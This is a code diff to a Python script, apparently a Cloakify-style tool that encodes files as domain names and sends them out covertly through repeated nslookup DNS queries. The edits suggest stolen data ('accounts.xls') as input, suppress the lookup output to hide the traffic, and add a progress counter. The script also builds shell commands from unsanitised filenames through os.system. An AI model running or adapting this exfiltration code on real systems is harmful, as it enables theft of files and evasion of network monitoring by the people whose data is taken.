@@ -154,7 +154,7 @@ def SelectCipherAndCloakifyFile():
 
 	while ( notDone ):
 
-		sourceFile = raw_input("Enter filename to cloak (e.g. ImADolphin.exe or /foo/bar.zip): ")
+		sourceFile = raw_input("Enter filename to cloak (e.g. payload.zip or accounts.xls): ")
 
 		if ( sourceFile != "" ):
 			notDone = False
@@ -391,7 +391,7 @@ def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):
 	print "Adding subdomain randomization to cloaked file using :", scriptFilename
 
 	try:
-		os.system( "ciphers/subdomain_randomizer_scripts/%s %s %s" % ( scriptFilename, cloakedFile ))
+		os.system( "ciphers/subdomain_randomizer_scripts/%s %s" % ( scriptFilename, cloakedFile ))
 
 	except:
 		print ""
@@ -474,21 +474,12 @@ def TransferCloakedFile( cloakedFile ):
 	print "### Starting Time (UTC): " + mDateTimeUTC.strftime( "%x %X" )
 	print ""
 
-	GenerateDNSQueries( cloakedFile )
+	status = GenerateDNSQueries( cloakedFile )
 
 	mDateTimeUTC = datetime.datetime.utcnow()
 
 	print ""
 	print "### Ending Time (UTC): " + mDateTimeUTC.strftime( "%x %X" )
-	print ""
-
-	if ( status > 0 ):
-
-		print "File transferred."
-
-	else:
-		print "File transfer failed."
-
 	print ""
 
 	return
@@ -517,8 +508,11 @@ def TransferCloakedFile( cloakedFile ):
 def GenerateDNSQueries( cloakedFile ):
 
 	tmpAddrStr = ""
+	byteCount = 0
 
 	with open( cloakedFile, 'r' ) as fqdnFile:
+
+		print "Progress (bytes transmitted - patience is a virtue): "
 
     		for fqdn in fqdnFile:
 
@@ -528,13 +522,22 @@ def GenerateDNSQueries( cloakedFile ):
 			# print fqdnStr
 
 			try:
-				commandStr = "nslookup " + fqdnStr
+				commandStr = "nslookup " + fqdnStr + " >/dev/null 2>&1"
 				os.system( commandStr )
 
 				os.system( "sleep 1" )
 		
 			except:
 				os.system( "sleep 1" )
+
+
+			checkpoint = byteCount % 25
+
+			if byteCount > 0 and checkpoint == 0:
+
+				print str( byteCount ) + "..."
+
+			byteCount = byteCount + 1
 
 	return
 
